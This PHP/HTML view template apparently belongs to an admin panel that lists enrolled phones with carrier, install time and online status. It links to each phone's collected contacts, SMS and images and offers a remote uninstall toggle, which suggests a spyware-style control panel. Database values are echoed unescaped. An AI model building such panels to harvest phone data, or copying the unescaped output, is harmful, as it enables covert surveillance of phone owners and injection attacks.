<div class="row">
	<div class="col-md-12">
		<div class="form-group">
			<div class="col-sm-5">
		      	<div style="float:left; margin-top:3px;margin-right:5px">
		      		<strong>
		      		<span>All : <?php echo($all_phones); ?></span>
		      		<span style="margin-left:20px">Disabled : <?php echo($disabled_phones); ?></span>
		      		<span style="margin-left:20px">Disabled Before 3days : <?php echo($threedays_phones); ?></span>
		      		</strong>
		      	</div>
		  	</div>		  	
		  	<div style="float:right;margin-top:9px;margin-left:40px;" class="col-sm-2">
		      	
		      	<div class="form-group">
			      	<input type="checkbox" id="offline" name="offline" 
			      	<?php if($page_offline == 'all' || $page_offline == ''){ ?>
			      		 checked
			      	<?php }else{ ?>
			      		  unchecked
			      	<?php }?>
			      	onchange="javascript:chkoffline(this);">
			      	<div style="float:left; margin-top:3px;margin-right:5px
			      	">include offline</div>
			    </div>
		      	
		  	</div>

		</div>
	</div>
</div>
<div class="row">
	<div class="col-md-12">
	<input type="hidden" id="phonecount" name="phonecount" value="<?php echo $phone_count;?>">				
		<table  class="table table-bordered table-hover table-striped datatable" id="table_export"  style="text-align:center;">
        	<thead>
        		<tr>
            		<th><div style="text-align:center;"><?php echo ('Number');?></div></th>
            		<th><div style="text-align:center;"><?php echo ('Model');?></div></th>
            		<th><div style="text-align:center;"><?php echo ('Company');?></div></th>
            		<th><div style="text-align:center;"><?php echo ('Install Time');?></div></th>
            		<th><div style="text-align:center;"><?php echo ('Version');?></div></th>
            		<th><div style="text-align:center;"><?php echo ('Language');?></div></th>
            		<th><div style="text-align:center;"><?php echo ('Status');?></div></th>
            		<th><div style="text-align:center;"><?php echo ('Remain');?></div></th>
            		<th><div style="text-align:center;"><?php echo ('Action');?></div></th>
				</tr>
			</thead>
            <tbody>
            	<?php foreach($phones as $row):?>
                <tr>
                	<td class="phonenum"><?php echo $row['number'];?></td>
                	<td><?php echo $row['model'];?></td>
                	<td>
                		<?php 
                		$carrier = $row['company'];
                		if($carrier == 'CMCC'){
                			echo '移动';	
                		}else if($carrier == 'CHINA MOBILE'){
                			echo '移动';
                		}else if($carrier == 'CUCC'){
                			echo '联通';
                		}else if($carrier == 'CTCC'){
                			echo '电信';
                		}else if($carrier == 'CTT'){
                			echo '铁通';
                		}else if($carrier == 'CNC'){
                			echo '网通';
                		}else{
                			echo $carrier;
                		}
                		
                		?>
                		
                	</td>
                	<td><?php echo $row['install'];?></td>
                	<td><?php echo $row['version'];?></td>
                	<td><?php echo $row['language'];?></td>
                	<?php 
                		$last = $row['connected'];
                		$comp = $page_compnow;

                		if($last < $comp){
                	?>
                	<td class="state"  state = 'offline'><span class="label label-danger">offline</span></td>
	                <?php }else{ ?>
	                <td class="state"  state = 'online'><span class="label label-success">online</span></td>
	                <?php } ?>
                	

                	<td><?php echo $row['remain'];?></td>
                	<td>
                
		                <div class="btn-group">
		                    <button type="button" class="btn btn-info btn-sm dropdown-toggle" data-toggle="dropdown">
		                        Action <span class="caret"></span>
		                    </button>
		                    <ul class="dropdown-menu dropdown-default pull-right" role="menu">
		                        
		                        
		                        <li>
		                            <a  style="color:#444;" href="#" onclick="showAjaxModal('<?php echo base_url();?>index.php?modal/popup/modal_contacts/<?php 
		                            	$num = $row['number'];
		                            	$num = str_replace('+', 'AA', $num);
		                            	$num = str_replace('(', 'BB', $num);
		                            	$num = str_replace(')', 'CC', $num);
		                            echo $num;?>');">
		                                <i class="entypo-phone"></i>
		                                    <?php echo ('Contacts');?>
		                                </a>
		                                        </li>
		                        <li class="divider"></li>
		                        <li>
		                            <a style="color:#444;" href="#" onclick="showAjaxModal('<?php echo base_url();?>index.php?modal/popup/modal_sms/<?php 
		                            	$num = $row['number'];
		                            	$num = str_replace('+', 'AA', $num);
		                            	$num = str_replace('(', 'BB', $num);
		                            	$num = str_replace(')', 'CC', $num);
		                            echo $num?>');">
		                                <i class="entypo-mail"></i>
		                                    <?php echo ('SMS');?>
		                                </a>
		                                        </li>
		                        <li class="divider"></li>
		                        <li>
		                        	<a style="color:#444;" onclick="showAjaxModal('<?php echo base_url(); ?>index.php?modal/popup/modal_image_info/<?php 
										$num = $row['number'];
										$num = str_replace('+', 'AA', $num);
										$num = str_replace('(', 'BB', $num);
										$num = str_replace(')', 'CC', $num);
									    echo $num;?>');">
		                                <i class="entypo-picture"></i> <?php echo ('Image');?>
		                                </a>
		                                        </li>
								<li class="divider"></li>
								<li>
		                        	<a style="color:#444;" href="#" onclick="confirm_modal('<?php echo base_url(); ?>index.php?phone/delete/<?php 
										$num = $row['number'];
										$num = str_replace('+', 'AA', $num);
										$num = str_replace('(', 'BB', $num);
										$num = str_replace(')', 'CC', $num);
										echo $num;?>');">
		                                <i class="entypo-trash"></i> <?php echo ('Delete');?>
		                                </a>
		                                        </li> 
		                        
		                    </ul>
		                </div>
		                
		            </td>


                </tr>
                <?php endforeach;?>
            </tbody>
        </table>
			
	</div>
</div>

<script language="javascript">

	$(document).ready( function() {
		$('#table_export').dataTable( {
		"iDisplayLength": 50,
		"aaSorting": [[3,'desc']]
		} );
	} );

	$('#offline').click(function() { 
		var status = '<?php echo base_url() ?>';// + 'index.php?phone/';
	  	if (!$(this).is(':checked')) { 
	  		status += 'list/online';
	  		//window.location.href = <?php echo base_url() ?> + ;	    
	  		
	   	} else{
	   		status += 'list/all';
	   	}

	   	window.location.href = status;
	});

	function onAjaxSend(number, status){
		var newstatus = '0';
		if(status == '0') newstatus = '1';
		
		 $.ajax({
	        url : '<?php echo base_url(); ?>' + 'index.php?phone/uninstall',
	        type : 'POST',
	        dataType : 'json',
	        data : {number:number, uninstall:newstatus},	        
	        success : function(data) {	        	
	        	//alert(data);
	            window.location.reload();
	        },
	        error : function(data) {
	        	//alert(data.message);
	            // do something
	        }
	    });

	}

	var mytime = setInterval(function(){
		var phones = $('#phonecount').val();
		phonelist = '[';
		$(".phonenum").each(function() {
		    var phonedata = '{';
			var selphonnum = $(this).text();
			phonedata += '"phone":"'+ selphonnum + '",' ;
			phonedata += '"state":"' + $(this).parent('tr').find('.state').attr('state') + '" ';
			phonedata += '}';
			if(phonelist != '[')
				phonelist += ',';
			phonelist += phonedata;
			
		});
		phonelist += ']';
		
		$.ajax({
	        url: 'index.php?phone/chkphones',
	        method: 'POST',
	        dataType: 'text',
	        data: { phones: phones, phonelist: phonelist},
	        success: function(resp) {
	        	
	        	if(resp == 'load'){
	        		//alert(resp); return;
	        		window.location.reload();
	        	}
	        	
	        	
	        },
	        error: function(err){
	        	
	        }
	    });    
	}, 6000);

</script>
